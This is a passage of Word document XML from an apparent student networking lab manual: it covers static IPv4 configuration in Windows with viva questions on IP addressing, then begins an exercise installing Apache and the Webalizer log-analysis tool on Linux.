          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. Click Change adapter settings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="719C0E2A" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Right-click the active network adapter → Properties.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E45FC0B" w14:textId="5DE33CB0" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Select Internet Protocol Version 4 (TCP/IPv4) → Properties.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5554DAF8" w14:textId="7541F44C" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. Choose Use the following IP address. Enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AE05507" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>IP Address: 172.16.36.100</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E532446" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Subnet Mask: 255.255.0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="037CE897" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Default Gateway: 172.16.36.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4964B299" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>6.Choose Use the following DNS server addresses.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33612EBE" w14:textId="7132EAC0" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4353A872" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Preferred DNS: 172.16.36.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DDC8DA5" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Alternate DNS: 8.8.8.8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="324AEFEA" w14:textId="7B71F54D" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>7.Click OK to save the settings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE2A305" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>8.Open Command Prompt and verify configuration using: ipconfig.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3494EDCE" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5073BC65" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>OUTPUT:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="030F5041" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3D6A53EF" wp14:editId="3322D9E8">
            <wp:extent cx="2594260" cy="2936778"/>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9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2594260" cy="2936778"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D866DC1" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>BEFORE:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292D8266" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5B0E6A34" wp14:editId="530D2D53">
            <wp:extent cx="5731510" cy="1586797"/>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0"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="1586797"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F04238" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>AFTER:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09293CE8" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3B909A3A" wp14:editId="35796B14">
            <wp:extent cx="5731510" cy="1618533"/>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1"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="1618533"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E124C9A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>RESULT:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F116BE3" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Thus, the manual IP assignment was completed and validated.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A64C94C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2273FE4B" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37CC05B2" w14:textId="5C2483AD" w:rsidR="00812B48" w:rsidRPr="00812B48" w:rsidRDefault="00812B48" w:rsidP="00812B48">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Viva Questions :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="578B1664" w14:textId="1AED737B" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. What is an IP address?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE6D37F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:An IP (Internet Protocol) address is a unique numerical identifier assigned to a device so that it can communicate with other devices on a network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4C6874" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. What is the difference between a static IP address and a dynamic IP address?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D50289E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:A static IP address is assigned manually and remains fixed, whereas a dynamic IP address is assigned automatically by a DHCP server and may change over time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3733269E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. What is a subnet mask?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="405D408F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:A subnet mask is used to divide an IP address into network and host portions, helping devices determine whether another device is in the same network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54827A86" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. What is the purpose of a default gateway?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CA358F2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:A default gateway allows a computer to communicate with devices that are outside its local network, such as the Internet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="119815D5" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. What happens if two computers are assigned the same IP address?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="128A3EA9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:An IP address conflict occurs, causing communication problems and preventing proper network connectivity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C92884C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4292663A" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C83C092" w14:textId="4B742A95" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Ex.No:15                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="657F8FA2" w14:textId="37247252" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00473FAE">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>TO ANALYZE THE DIFFERENT TYPES OF SERVERS USING</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69B61796" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00473FAE">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>WEBALIZER TOOL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09B3B840" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>AIM:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EB03229" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>To install Webalizer and analyze server log files to study server activity and traffic patterns.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5881309A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>INTRODUCTION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F325863" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Webalizer is a web log analysis tool used to generate graphical reports from server log files. It helps in understanding server activity such as hits, visits, requested URLs, and client usage. In this experiment, Webalizer is used to analyze logs from a web server and study how different types of server requests are handled.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7975C300" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>PROCEDURE :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="700F4D5B" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Update the system using sudo apt update.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21C1744D" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. Install Apache server using sudo apt install apache2 -y.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C9EDDA5" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Start Apache with sudo systemctl start apache2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="028FFEED" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Install Webalizer using sudo apt install webalizer -y.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74C78035" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. Generate traffic by accessing http://localhost/ or using curl.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0570009A" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>6. Create Webalizer output directory:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE0DD09" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>7. sudo mkdir -p /var/www/html/webalizer</w:t>
